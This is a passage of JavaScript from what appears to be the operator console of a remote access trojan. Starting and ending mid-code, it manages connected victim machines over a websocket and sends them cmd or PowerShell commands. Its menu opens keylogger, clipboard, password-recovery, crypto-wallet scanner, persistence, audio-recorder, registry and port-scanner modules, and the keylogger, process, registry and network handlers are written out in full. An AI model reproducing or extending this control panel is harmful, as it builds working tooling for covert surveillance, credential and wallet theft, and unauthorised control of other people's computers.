                        case 'processes_list':
    this.handleProcessesList(data);
    break;
case 'process_kill_result':
    this.handleProcessKillResult(data);
    break;
case 'process_start_result':
    this.handleProcessStartResult(data);
    break;
case 'process_priority_result':
    this.handleProcessPriorityResult(data);
    break;
case 'process_details':
    this.handleProcessDetails(data);
    break;
                    case 'screenshot':
                        this.updateScreenshot(data);
                        break;
                    case 'file_chunk_ack':
                        this.handleFileChunkAck(data);
                        break;
                    case 'file_upload_complete':
                        this.handleFileUploadComplete(data);
                        break;
                    case 'execute_response':
                        this.handleExecuteResponse(data);
                        break;
                    case 'fm_drives':
                        this.handleFmDrives(data);
                        break;
                    case 'fm_files':
                        this.handleFmFiles(data);
                        break;
                    case 'fm_operation_result':
                        this.handleFmOperationResult(data);
                        break;
                    case 'fm_download_start':
                        this.handleFmDownloadStart(data);
                        break;
                    case 'fm_download_chunk':
                        this.handleFmDownloadChunk(data);
                        break;
                    case 'fm_download_complete':
                        this.handleFmDownloadComplete(data);
                        break;
                    case 'fm_search_result':
                        this.handleFmSearchResult(data);
                        break;
                    case 'fm_search_complete':
                        this.handleFmSearchComplete(data);
                        break;
                }
            }
            
            updateClientsList(clients) {
                const clientsList = document.getElementById('clientsList');
                document.getElementById('clientCount').textContent = clients.length;
                
                if (clients.length === 0) {
                    clientsList.innerHTML = '<div class="no-clients">NO ACTIVE CLIENTS</div>';
                    this.clients.clear();
                    return;
                }
                
                // Clear and rebuild list
                clientsList.innerHTML = '';
                
                clients.forEach(client => {
                    const connectedTime = new Date(client.connected_at).toLocaleTimeString();
                    const hostname = client.hostname || 'Unknown';
                    const os = client.os || 'Unknown';
                    
                    const clientElement = document.createElement('div');
                    clientElement.className = 'client-item';
                    clientElement.dataset.clientId = client.id;
                    clientElement.innerHTML = `
                        <div class="client-id">
                            <span class="client-status"></span>${client.id}
                        </div>
                        <div class="client-info">
                             ${client.remote_addr}<br>
                             ${hostname} | ${os}<br>
                             ${connectedTime}
                        </div>
                    `;
                    
                    clientElement.addEventListener('click', () => {
                        this.selectClient(client.id);
                    });
                    
                    clientsList.appendChild(clientElement);
                    this.clients.set(client.id, client);
                });
            }
            
            selectClient(clientId) {
                // Remove previous selection
                document.querySelectorAll('.client-item.selected').forEach(item => {
                    item.classList.remove('selected');
                });
                
                // Select new client
                const clientElement = document.querySelector(`[data-client-id="${clientId}"]`);
                if (clientElement) {
                    clientElement.classList.add('selected');
                    this.selectedClient = clientId;
                    
                    document.getElementById('commandInput').disabled = false;
                    document.getElementById('sendBtn').disabled = false;
                    
                    this.addTerminalOutput(`>>> CLIENT SELECTED: ${clientId}`, 'system');
                }
            }
            
            sendCommand() {
                const commandInput = document.getElementById('commandInput');
                const shellType = document.getElementById('shellType').value;
                const command = commandInput.value.trim();
                
                if (!this.selectedClient) return;
                
                // Handle remote desktop selection
                if (shellType === 'remote-desktop') {
                    this.openRemoteDesktop();
                    return;
                }
                
                // Handle remote execute selection
                if (shellType === 'remote-execute') {
                    this.openRemoteExecute();
                    return;
                }
                
                // Handle file manager selection
                if (shellType === 'file-manager') {
                    this.openFileManager();
                    return;
                }

                if (shellType === 'process-manager') {
                this.openProcessManager();
                return;
                 }

                 if (shellType === 'clipboard-manager') {
                    this.openClipboardManager();
                    return;
                 }

                if (shellType === 'keylog-manager') {
                    this.openKeylogger();
                    return;
                 }

                
                if (!command) return;
                
                const fullCommand = shellType === 'powershell' ? 
                    `powershell.exe -Command "${command}"` : 
                    command;
                
                this.addTerminalOutput(`${this.selectedClient}@${shellType}:~$ ${command}`, 'command');
                
                const message = {
                    type: 'send_command',
                    client_id: this.selectedClient,
                    command: fullCommand
                };
                
                this.ws.send(JSON.stringify(message));
                commandInput.value = '';
            }
            
            handleCommandResponse(data) {
                const output = data.data || 'No output';
                const status = data.success ? 'success' : 'error';
                this.addTerminalOutput(output, status);
            }
            
            addTerminalOutput(text, type = 'normal') {
                const terminal = document.getElementById('terminal');
                const output = document.createElement('div');
                output.className = 'terminal-output';
                
                const timestamp = new Date().toLocaleTimeString();
                let prefix = '';
                let color = '#00ff00';
                
                switch (type) {
                    case 'system':
                        prefix = '[SYS] ';
                        color = '#00ffff';
                        break;
                    case 'error':
                        prefix = '[ERR] ';
                        color = '#ff0000';
                        break;
                    case 'command':
                        prefix = '[CMD] ';
                        color = '#ffff00';
                        break;
                    case 'success':
                        color = '#00ff00';
                        break;
                }
                
                output.innerHTML = `<span style="color: #666">[${timestamp}]</span> <span style="color: ${color}">${prefix}${text}</span>`;
                terminal.appendChild(output);
                terminal.scrollTop = terminal.scrollHeight;
            }
            
            updateStatus(status, connected) {
                const statusElement = document.getElementById('connectionStatus');
                const statusText = document.getElementById('statusText');
                
                statusElement.className = `connection-status ${connected ? 'connected' : 'disconnected'}`;
                statusText.textContent = status;
            }
            
            setupEventListeners() {
                const commandInput = document.getElementById('commandInput');
                const sendBtn = document.getElementById('sendBtn');
                const shellType = document.getElementById('shellType');
                
                commandInput.addEventListener('keypress', (e) => {
                    if (e.key === 'Enter') {
                        this.sendCommand();
                    }
                });
                
                sendBtn.addEventListener('click', () => {
                    this.sendCommand();
                });
                
                // Handle shell type change
               // Replace the shell type event listener in setupEventListeners() with this:

shellType.addEventListener('change', (e) => {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> Please select a client first', 'error');
        e.target.value = 'cmd'; // Reset to cmd
        return;
    }
    
    const selectedType = e.target.value;
    
    switch(selectedType) {
        case 'remote-desktop':
            this.openRemoteDesktop();
            break;
        case 'remote-execute':
            this.openRemoteExecute();
            break;
        case 'file-manager':
            this.openFileManager();
            break;
        case 'process-manager':
            this.openProcessManager();
            break;
        case 'clipboard-manager':
            this.openClipboardManager();
            break;


        case 'keylog-manager':
            this.openKeylogger();
        break;
        
            case 'registry-editor':
    this.openRegistryEditor();
    break;

    case 'network-tools':
    this.openNetworkTools();
    break;

    case 'audio-recorder':
    this.openAudioRecorder();
    break;

case 'persistence':
    this.openPersistenceManager();
    break;

case 'wallet-scanner':
    this.openWalletScanner();
    break;
case 'troll-panel':
    this.openTrollPanel();
    break;
case 'system-info':
    this.openSysInfoPanel();
    break;
    case 'script-execution': // This case was missing
            this.openScriptPanel();
            break;
case 'password-recovery':
    this.startPasswordRecovery();
    break;

    }

    
    
    // Reset to cmd after opening modal
    if (selectedType !== 'cmd' && selectedType !== 'powershell') {
        setTimeout(() => {
            e.target.value = 'cmd';
        }, 100);
    }
});
            }





openKeylogger() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for keylogger', 'error');
        return;
    }
    
    document.getElementById('keyloggerClientId').textContent = this.selectedClient;
    document.getElementById('keyloggerModal').style.display = 'flex';
    
    this.keyloggerActive = false;
    this.keylogData = '';
    
    // Get current keylog
    this.getKeylog();
    
    this.addTerminalOutput(`>>> Opening keylogger for ${this.selectedClient}`, 'system');
}

toggleKeylogger() {
    const btn = document.getElementById('keyloggerStartBtn');
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.getElementById('keyloggerStatusText');
    
    if (this.keyloggerActive) {
        this.ws.send(JSON.stringify({
            type: 'stop_keylogger',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'START LOGGING';
        btn.classList.remove('active');
        statusIndicator.classList.remove('active');
        statusIndicator.classList.add('inactive');
        statusText.textContent = 'INACTIVE';
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_keylogger',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'STOP LOGGING';
        btn.classList.add('active');
        statusIndicator.classList.add('active');
        statusIndicator.classList.remove('inactive');
        statusText.textContent = 'ACTIVE';
    }
    
    this.keyloggerActive = !this.keyloggerActive;
}

getKeylog() {
    this.ws.send(JSON.stringify({
        type: 'get_keylog',
        client_id: this.selectedClient
    }));
}

clearKeylog() {
    if (confirm('Clear all captured keystrokes?')) {
        this.ws.send(JSON.stringify({
            type: 'clear_keylog',
            client_id: this.selectedClient
        }));
        
        this.keylogData = '';
        document.getElementById('keylogContent').textContent = 'No keystrokes captured yet...';
        this.updateKeylogStats();
    }
}

exportKeylog() {
    if (!this.keylogData) {
        alert('No keylog data to export');
        return;
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `keylog_${this.selectedClient}_${timestamp}.txt`;
    
    const blob = new Blob([this.keylogData], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    this.addTerminalOutput(`>>> Keylog exported to ${filename}`, 'success');
}

handleKeyloggerStatus(data) {
    const statusIndicator = document.querySelector('.status-indicator');
    const statusText = document.getElementById('keyloggerStatusText');
    const btn = document.getElementById('keyloggerStartBtn');
    
    if (data.active) {
        this.keyloggerActive = true;
        btn.textContent = 'STOP LOGGING';
        btn.classList.add('active');
        statusIndicator.classList.add('active');
        statusIndicator.classList.remove('inactive');
        statusText.textContent = 'ACTIVE';
    } else {
        this.keyloggerActive = false;
        btn.textContent = 'START LOGGING';
        btn.classList.remove('active');
        statusIndicator.classList.remove('active');
        statusIndicator.classList.add('inactive');
        statusText.textContent = 'INACTIVE';
    }
    
    if (data.message) {
        this.addTerminalOutput(`>>> Keylogger: ${data.message}`, 'system');
    }
}

handleKeylogData(data) {
    this.keylogData = data.data || '';
    this.displayKeylog(this.keylogData);
    this.updateKeylogStats();
}

handleKeylogUpdate(data) {
    // Append new data
    this.keylogData += data.data || '';
    this.displayKeylog(this.keylogData);
    this.updateKeylogStats();
    
    // Update last update time
    document.getElementById('keylogLastUpdate').textContent = new Date().toLocaleTimeString();
}

handleKeylogClear(data) {
    if (data.success) {
        this.keylogData = '';
        document.getElementById('keylogContent').textContent = 'No keystrokes captured yet...';
        this.updateKeylogStats();
        this.addTerminalOutput('>>> Keylog cleared', 'success');
    }
}

displayKeylog(data) {
    const content = document.getElementById('keylogContent');
    
    if (!data || data.length === 0) {
        content.textContent = 'No keystrokes captured yet...';
        return;
    }
    
    // Process and highlight special keys
    let processed = data
        .replace(/\[ENTER\]/g, '<span class="special-key">[ENTER]</span>\n')
        .replace(/\[TAB\]/g, '<span class="special-key">[TAB]</span>')
        .replace(/\[BACKSPACE\]/g, '<span class="special-key">[BS]</span>')
        .replace(/\[ESC\]/g, '<span class="special-key">[ESC]</span>')
        .replace(/\[DEL\]/g, '<span class="special-key">[DEL]</span>')
        .replace(/\[CTRL\]/g, '<span class="special-key">[CTRL]</span>')
        .replace(/\[ALT\]/g, '<span class="special-key">[ALT]</span>')
        .replace(/\[SHIFT\]/g, '<span class="special-key">[SHIFT]</span>')
        .replace(/\[CAPS\]/g, '<span class="special-key">[CAPS]</span>')
        .replace(/\[(F\d+)\]/g, '<span class="special-key">[$1]</span>')
        .replace(/\[(UP|DOWN|LEFT|RIGHT)\]/g, '<span class="special-key">[$1]</span>');
    
    content.innerHTML = processed;
    
    // Scroll to bottom
    content.scrollTop = content.scrollHeight;
}

updateKeylogStats() {
    const data = this.keylogData || '';
    
    // Calculate stats
    const chars = data.length;
    const words = data.split(/\s+/).filter(w => w.length > 0).length;
    const lines = data.split(/\[ENTER\]|\n/).length;
    const bytes = new Blob([data]).size;
    
    // Update display
    document.getElementById('keylogChars').textContent = chars.toLocaleString();
    document.getElementById('keylogWords').textContent = words.toLocaleString();
    document.getElementById('keylogLines').textContent = lines.toLocaleString();
    document.getElementById('keylogSize').textContent = this.formatFileSize(bytes);
}







            openProcessManager() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for process manager', 'error');
        return;
    }
    
    document.getElementById('processClientId').textContent = this.selectedClient;
    document.getElementById('processModal').style.display = 'flex';
    
    // Load processes
    this.refreshProcesses();
    
    this.addTerminalOutput(`>>> Opening process manager for ${this.selectedClient}`, 'system');
}

refreshProcesses() {
    this.ws.send(JSON.stringify({
        type: 'get_processes',
        client_id: this.selectedClient
    }));
    
    document.getElementById('processList').innerHTML = '<div class="loading">Loading processes...</div>';
}

handleProcessesList(data) {
    const processList = document.getElementById('processList');
    processList.innerHTML = '';
    
    if (!data.processes || data.processes.length === 0) {
        processList.innerHTML = '<div class="loading">No processes found</div>';
        return;
    }
    
    // Store processes for search
    this.processes = data.processes;
    
    // Sort by memory usage
    data.processes.sort((a, b) => b.memory - a.memory);
    
    data.processes.forEach(process => {
        const item = this.createProcessItem(process);
        processList.appendChild(item);
    });
    
    document.getElementById('processCount').textContent = `${data.processes.length} processes`;
}


createProcessItem(process) {
    const item = document.createElement('div');
    item.className = 'process-item';
    item.dataset.pid = process.pid;
    
    item.innerHTML = `
        <div>${process.pid}</div>
        <div title="${process.name}">${process.name}</div>
        <div>${this.formatMemory(process.memory)}</div>
        <div>${process.threads || 0}</div>
    `;
    
    item.addEventListener('click', () => this.selectProcess(process));
    
    return item;
}

formatMemory(kb) {
    if (kb < 1024) return kb + ' KB';
    if (kb < 1024 * 1024) return (kb / 1024).toFixed(1) + ' MB';
    return (kb / 1024 / 1024).toFixed(1) + ' GB';
}

selectProcess(process) {
    // Clear previous selection
    document.querySelectorAll('.process-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    // Select new process
    const item = document.querySelector(`[data-pid="${process.pid}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedProcess = process;
        
        // Enable action buttons
        document.getElementById('killProcessBtn').disabled = false;
        document.getElementById('processPrioritySelect').disabled = false;
        document.getElementById('processDetailsBtn').disabled = false;
    }
}

searchProcesses(event) {
    const searchTerm = event.target.value.toLowerCase();
    
    if (!searchTerm) {
        this.refreshProcesses();
        return;
    }
    
    const filtered = this.processes.filter(p => 
        p.name.toLowerCase().includes(searchTerm) ||
        p.pid.toString().includes(searchTerm)
    );
    
    const processList = document.getElementById('processList');
    processList.innerHTML = '';
    
    filtered.forEach(process => {
        const item = this.createProcessItem(process);
        processList.appendChild(item);
    });
    
    document.getElementById('processCount').textContent = `${filtered.length} processes (filtered)`;
}

killSelectedProcess() {
    if (!this.selectedProcess) return;
    
    if (confirm(`Kill process ${this.selectedProcess.name} (PID: ${this.selectedProcess.pid})?`)) {
        this.ws.send(JSON.stringify({
            type: 'kill_process',
            client_id: this.selectedClient,
            process_id: this.selectedProcess.pid
        }));
        
        document.getElementById('processStatusText').textContent = `Killing process ${this.selectedProcess.pid}...`;
    }
}

setProcessPriority() {
    const priority = document.getElementById('processPrioritySelect').value;
    if (!priority || !this.selectedProcess) return;
    
    this.ws.send(JSON.stringify({
        type: 'set_process_priority',
        client_id: this.selectedClient,
        process_id: this.selectedProcess.pid,
        priority: priority
    }));
    
    document.getElementById('processStatusText').textContent = `Setting priority to ${priority}...`;
    document.getElementById('processPrioritySelect').value = '';
}

showStartProcessDialog() {
    document.getElementById('startProcessDialog').style.display = 'block';
    document.getElementById('processPathInput').focus();
}

hideStartProcessDialog() {
    document.getElementById('startProcessDialog').style.display = 'none';
    document.getElementById('processPathInput').value = '';
    document.getElementById('processArgsInput').value = '';
}

startNewProcess() {
    const path = document.getElementById('processPathInput').value.trim();
    const args = document.getElementById('processArgsInput').value.trim();
    
    if (!path) {
        alert('Please enter a process path');
        return;
    }
    
    this.ws.send(JSON.stringify({
        type: 'start_process',
        client_id: this.selectedClient,
        process_path: path,
        process_args: args
    }));
    
    this.hideStartProcessDialog();
    document.getElementById('processStatusText').textContent = `Starting ${path}...`;
}

getProcessDetails() {
    if (!this.selectedProcess) return;
    
    this.ws.send(JSON.stringify({
        type: 'get_process_details',
        client_id: this.selectedClient,
        process_id: this.selectedProcess.pid
    }));
}

handleProcessDetails(data) {
    const content = document.getElementById('processDetailsContent');
    content.innerHTML = `
        <div><strong>PID:</strong> ${data.pid}</div>
        <div><strong>Path:</strong> ${data.path || 'Unknown'}</div>
        <div><strong>Start Time:</strong> ${data.start_time || 'Unknown'}</div>
    `;
    
    document.getElementById('processDetailsDialog').style.display = 'block';
}

hideProcessDetails() {
    document.getElementById('processDetailsDialog').style.display = 'none';
}

handleProcessKillResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = `Process ${data.pid} killed successfully`;
        this.refreshProcesses();
    } else {
        document.getElementById('processStatusText').textContent = `Failed to kill process: ${data.error}`;
    }
}

handleProcessStartResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = 'Process started successfully';
        this.refreshProcesses();
    } else {
        document.getElementById('processStatusText').textContent = `Failed to start process: ${data.error}`;
    }
}

handleProcessPriorityResult(data) {
    if (data.success) {
        document.getElementById('processStatusText').textContent = 'Priority changed successfully';
    } else {
        document.getElementById('processStatusText').textContent = 'Failed to change priority';
    }
}
            




openRegistryEditor() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for registry editor', 'error');
        return;
    }
    
    // Check if Windows client
    const client = this.clients.get(this.selectedClient);
    if (client && client.os !== 'Windows') {
        this.addTerminalOutput('>>> Registry editor is only available for Windows clients', 'error');
        return;
    }
    
    document.getElementById('registryClientId').textContent = this.selectedClient;
    document.getElementById('registryModal').style.display = 'flex';
    
    this.currentRegistryPath = '';
    this.selectedRegistryKey = null;
    
    // Load initial keys
    this.navigateRegistry();
    
    this.addTerminalOutput(`>>> Opening registry editor for ${this.selectedClient}`, 'system');
}

navigateRegistry() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value.trim();
    
    this.currentRegistryPath = path;
    
    // Clear values panel
    document.getElementById('registryValues').innerHTML = '<div class="no-selection">Loading...</div>';
    
    // Get keys
    this.ws.send(JSON.stringify({
        type: 'registry_enum_keys',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path
    }));
    
    // Get values
    this.ws.send(JSON.stringify({
        type: 'registry_enum_values',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path
    }));
    
    this.updateRegistryStatus(`Navigating to ${hive}\\${path || 'ROOT'}`);
}

refreshRegistry() {
    this.navigateRegistry();
}

handleRegistryKeysList(data) {
    const keysContainer = document.getElementById('registryKeys');
    keysContainer.innerHTML = '';
    
    if (!data.keys || data.keys.length === 0) {
        keysContainer.innerHTML = '<div class="no-selection">No subkeys found</div>';
        return;
    }
    
    // Add parent directory option if not at root
    if (this.currentRegistryPath) {
        const parentItem = document.createElement('div');
        parentItem.className = 'registry-key-item';
        parentItem.innerHTML = `
            <span class="key-icon"></span>
            <span>..</span>
        `;
        parentItem.addEventListener('click', () => this.navigateUpRegistry());
        keysContainer.appendChild(parentItem);
    }
    
    // Add all keys
    data.keys.forEach(key => {
        const item = document.createElement('div');
        item.className = 'registry-key-item';
        item.dataset.keyName = key;
        item.innerHTML = `
            <span class="key-icon"></span>
            <span>${key}</span>
        `;
        
        item.addEventListener('click', () => this.selectRegistryKey(key));
        item.addEventListener('dblclick', () => this.openRegistryKey(key));
        
        keysContainer.appendChild(item);
    });
}

handleRegistryValuesList(data) {
    const valuesContainer = document.getElementById('registryValues');
    valuesContainer.innerHTML = '';
    
    if (!data.values || data.values.length === 0) {
        valuesContainer.innerHTML = '<div class="no-selection">No values found</div>';
        return;
    }
    
    data.values.forEach(value => {
        const item = document.createElement('div');
        item.className = 'registry-value-item';
        item.innerHTML = `
            <div class="value-name">${value.name || '(Default)'}</div>
            <div class="value-type">${value.type}</div>
            <div class="value-data" title="Click to view/edit">...</div>
        `;
        
        item.addEventListener('click', () => this.getRegistryValue(value.name));
        
        valuesContainer.appendChild(item);
    });
}

selectRegistryKey(key) {
    // Clear previous selection
    document.querySelectorAll('.registry-key-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    // Select new key
    const item = document.querySelector(`[data-key-name="${key}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedRegistryKey = key;
        document.getElementById('deleteRegBtn').disabled = false;
    }
}

openRegistryKey(key) {
    const currentPath = document.getElementById('registryPathInput').value;
    const newPath = currentPath ? `${currentPath}\\${key}` : key;
    document.getElementById('registryPathInput').value = newPath;
    this.navigateRegistry();
}

navigateUpRegistry() {
    const currentPath = document.getElementById('registryPathInput').value;
    const parts = currentPath.split('\\');
    parts.pop();
    document.getElementById('registryPathInput').value = parts.join('\\');
    this.navigateRegistry();
}

getRegistryValue(valueName) {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    
    this.ws.send(JSON.stringify({
        type: 'registry_read',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path,
        registry_value: valueName
    }));
}

handleRegistryReadResult(data) {
    if (data.success) {
        // Show in edit dialog
        document.getElementById('regValueName').value = data.value_name || '';
        document.getElementById('regValueType').value = data.value_type;
        document.getElementById('regValueData').value = data.data;
        document.getElementById('addValueDialog').style.display = 'block';
        
        this.updateRegistryStatus(`Read value: ${data.value_name || '(Default)'}`);
    }
}

showAddValueDialog() {
    document.getElementById('regValueName').value = '';
    document.getElementById('regValueType').value = 'REG_SZ';
    document.getElementById('regValueData').value = '';
    document.getElementById('addValueDialog').style.display = 'block';
}

hideAddValueDialog() {
    document.getElementById('addValueDialog').style.display = 'none';
}

saveRegistryValue() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    const name = document.getElementById('regValueName').value;
    const type = document.getElementById('regValueType').value;
    const data = document.getElementById('regValueData').value;
    
    this.ws.send(JSON.stringify({
        type: 'registry_write',
        client_id: this.selectedClient,
        registry_hive: hive,
        registry_key: path,
        registry_value: name,
        registry_value_type: type,
        registry_data: data
    }));
    
    this.hideAddValueDialog();
    this.updateRegistryStatus(`Writing value: ${name || '(Default)'}`);
}

deleteRegistryItem() {
    const hive = document.getElementById('registryHiveSelect').value;
    const path = document.getElementById('registryPathInput').value;
    
    if (this.selectedRegistryKey) {
        if (confirm(`Delete registry key: ${this.selectedRegistryKey}?`)) {
            const fullPath = path ? `${path}\\${this.selectedRegistryKey}` : this.selectedRegistryKey;
            
            this.ws.send(JSON.stringify({
                type: 'registry_delete',
                client_id: this.selectedClient,
                registry_hive: hive,
                registry_key: fullPath
            }));
            
            this.updateRegistryStatus(`Deleting key: ${this.selectedRegistryKey}`);
        }
    }
}

handleRegistryWriteResult(data) {
    if (data.success) {
        this.updateRegistryStatus('Value written successfully');
        this.navigateRegistry(); // Refresh
    } else {
        this.updateRegistryStatus('Failed to write value');
    }
}

handleRegistryDeleteResult(data) {
    if (data.success) {
        this.updateRegistryStatus('Deleted successfully');
        this.navigateRegistry(); // Refresh
    } else {
        this.updateRegistryStatus('Failed to delete');
    }
}

handleRegistryError(data) {
    this.updateRegistryStatus(`Error: ${data.error}`);
}

updateRegistryStatus(message) {
    document.getElementById('registryStatus').textContent = message;
}


openNetworkTools() {
    if (!this.selectedClient) {
        this.addTerminalOutput('>>> No client selected for network tools', 'error');
        return;
    }
    
    document.getElementById('networkClientId').textContent = this.selectedClient;
    document.getElementById('networkModal').style.display = 'flex';
    
    this.netstatMonitoring = false;
    this.portScanActive = false;
    this.connections = [];
    this.openPorts = [];
    
    // Load initial connections
    this.refreshConnections();
    
    this.addTerminalOutput(`>>> Opening network tools for ${this.selectedClient}`, 'system');
}

switchNetworkTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.network-tab').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    
    // Show/hide panels
    if (tab === 'connections') {
        document.getElementById('connectionsPanel').style.display = 'flex';
        document.getElementById('scannerPanel').style.display = 'none';
    } else {
        document.getElementById('connectionsPanel').style.display = 'none';
        document.getElementById('scannerPanel').style.display = 'flex';
    }
}

// Connections Tab Methods
refreshConnections() {
    this.ws.send(JSON.stringify({
        type: 'get_connections',
        client_id: this.selectedClient
    }));
    
    document.getElementById('connectionsList').innerHTML = '<div class="loading">Loading connections...</div>';
}

handleConnectionsList(data) {
    const connectionsList = document.getElementById('connectionsList');
    connectionsList.innerHTML = '';
    
    if (!data.connections || data.connections.length === 0) {
        connectionsList.innerHTML = '<div class="no-results">No active connections</div>';
        return;
    }
    
    this.connections = data.connections;
    
    data.connections.forEach(conn => {
        const item = this.createConnectionItem(conn);
        connectionsList.appendChild(item);
    });
    
    document.getElementById('connectionsCount').textContent = `${data.connections.length} connections`;
    document.getElementById('connectionsStatusText').textContent = 'Updated';
}

createConnectionItem(conn) {
    const item = document.createElement('div');
    item.className = 'connection-item';
    item.dataset.pid = conn.pid;
    item.dataset.localPort = conn.local_port;
    
    item.innerHTML = `
        <div class="connection-protocol">${conn.protocol}</div>
        <div>${conn.local_addr}:${conn.local_port}</div>
        <div>${conn.remote_addr}:${conn.remote_port}</div>
        <div class="connection-state">${conn.state}</div>
        <div>${conn.process} (PID: ${conn.pid})</div>
    `;
    
    item.addEventListener('click', () => this.selectConnection(conn));
    
    return item;
}

selectConnection(conn) {
    document.querySelectorAll('.connection-item.selected').forEach(item => {
        item.classList.remove('selected');
    });
    
    const item = document.querySelector(`[data-pid="${conn.pid}"][data-local-port="${conn.local_port}"]`);
    if (item) {
        item.classList.add('selected');
        this.selectedConnection = conn;
        document.getElementById('closeConnectionBtn').disabled = false;
    }
}

filterConnections(event) {
    const filter = event.target.value.toLowerCase();
    
    if (!filter) {
        this.handleConnectionsList({ connections: this.connections });
        return;
    }
    
    const filtered = this.connections.filter(conn => 
        conn.protocol.toLowerCase().includes(filter) ||
        conn.local_addr.includes(filter) ||
        conn.remote_addr.includes(filter) ||
        conn.process.toLowerCase().includes(filter) ||
        conn.state.toLowerCase().includes(filter)
    );
    
    this.handleConnectionsList({ connections: filtered });
}

closeSelectedConnection() {
    if (!this.selectedConnection) return;
    
    if (confirm(`Close connection ${this.selectedConnection.local_addr}:${this.selectedConnection.local_port} -> ${this.selectedConnection.remote_addr}:${this.selectedConnection.remote_port}?`)) {
        this.ws.send(JSON.stringify({
            type: 'close_connection',
            client_id: this.selectedClient,
            connection_pid: this.selectedConnection.pid,
            local_port: this.selectedConnection.local_port,
            remote_port: this.selectedConnection.remote_port
        }));
        
        document.getElementById('connectionsStatusText').textContent = 'Closing connection...';
    }
}

toggleNetstatMonitor() {
    const btn = document.getElementById('netstatMonitorBtn');
    
    if (this.netstatMonitoring) {
        this.ws.send(JSON.stringify({
            type: 'stop_netstat_monitor',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'START MONITOR';
        btn.classList.remove('active');
        this.netstatMonitoring = false;
    } else {
        this.ws.send(JSON.stringify({
            type: 'start_netstat_monitor',
            client_id: this.selectedClient
        }));
        
        btn.textContent = 'STOP MONITOR';
        btn.classList.add('active');
        this.netstatMonitoring = true;
    }
}

handleConnectionCloseResult(data) {
    if (data.success) {
        document.getElementById('connectionsStatusText').textContent = 'Connection closed';
        this.refreshConnections();
    } else {
        document.getElementById('connectionsStatusText').textContent = 'Failed to close connection';
    }
}

// Port Scanner Methods
startPortScan() {
    const target = document.getElementById('scanTargetInput').value.trim();
    const startPort = parseInt(document.getElementById('scanStartPort').value) || 1;
    const endPort = parseInt(document.getElementById('scanEndPort').value) || 1000;
    
    if (!target) {
        alert('Please enter a target IP address');
        return;
    }
    
    if (startPort > endPort) {
        alert('Start port must be less than end port');
        return;
    }
    
    this.portScanActive = true;
    this.openPorts = [];
    
    // Update UI
    document.getElementById('startScanBtn').disabled = true;
    document.getElementById('stopScanBtn').disabled = false;
    document.getElementById('scanProgressSection').style.display = 'block';
    document.getElementById('scanTarget').textContent = target;
    document.getElementById('scanProgress').textContent = '0%';
    document.getElementById('scanProgressBar').style.width = '0%';
    document.getElementById('scanResults').innerHTML = '<div class="loading">Scanning...</div>';
    
    // Send scan command
    this.ws.send(JSON.stringify({
        type: 'scan_ports',
        client_id: this.selectedClient,
        scan_target: target,
        start_port: startPort,
        end_port: endPort
    }));
    
    document.getElementById('scannerStatus').textContent = `Scanning ${target}:${startPort}-${endPort}`;
}

stopPortScan() {
    this.ws.send(JSON.stringify({
        type: 'stop_port_scan',
        client_id: this.selectedClient
    }));
    
    this.portScanActive = false;
    document.getElementById('startScanBtn').disabled = false;
    document.getElementById('stopScanBtn').disabled = true;
    document.getElementById('scannerStatus').textContent = 'Scan stopped';
}

setScanPreset(preset) {
    switch(preset) {
        case 'common':
            document.getElementById('scanStartPort').value = '1';
            document.getElementById('scanEndPort').value = '1000';
            break;
        case 'web':
            document.getElementById('scanStartPort').value = '80';
            document.getElementById('scanEndPort').value = '8080';
            break;
        case 'full':
            document.getElementById('scanStartPort').value = '1';
            document.getElementById('scanEndPort').value = '65535';
            break;
    }
}

handlePortScanStarted(data) {
    document.getElementById('scannerStatus').textContent = `Scanning ${data.target} (${data.range})`;
}

handlePortScanProgress(data) {
    document.getElementById('scanProgress').textContent = `${data.progress}%`;
    document.getElementById('scanProgressBar').style.width = `${data.progress}%`;
}

handlePortFound(data) {
    if (data.open) {
        this.openPorts.push({
            port: data.port,
            service: data.service
        });
        
        // Update results immediately
        this.updateScanResults();
    }
}

handlePortScanComplete(data) {
    this.portScanActive = false;
    document.getElementById('startScanBtn').disabled = false;
    document.getElementById('stopScanBtn').disabled = true;
    document.getElementById('scanProgressSection').style.display = 'none';
    
    document.getElementById('scannerStatus').textContent = 
        `Scan complete: ${data.total_open} open ports found out of ${data.total_scanned} scanned`;
    
    if (data.open_ports) {
        this.openPorts = data.open_ports;
        this.updateScanResults();
    }
}

updateScanResults() {
    const resultsContainer = document.getElementById('scanResults');
    
    if (this.openPorts.length === 0) {
        resultsContainer.innerHTML = '<div class="no-results">No open ports found</div>';
        return;
    }
    
    resultsContainer.innerHTML = '';
    
    // Sort by port number
    this.openPorts.sort((a, b) => a.port - b.port);
    
    this.openPorts.forEach(port => {
        const item = document.createElement('div');
        item.className = 'port-item';
        item.innerHTML = `
            <div>
                <span class="port-number">${port.port}</span>
                ${port.service ? `<span class="port-service">${port.service}</span>` : ''}
            </div>
        `;
        resultsContainer.appendChild(item);
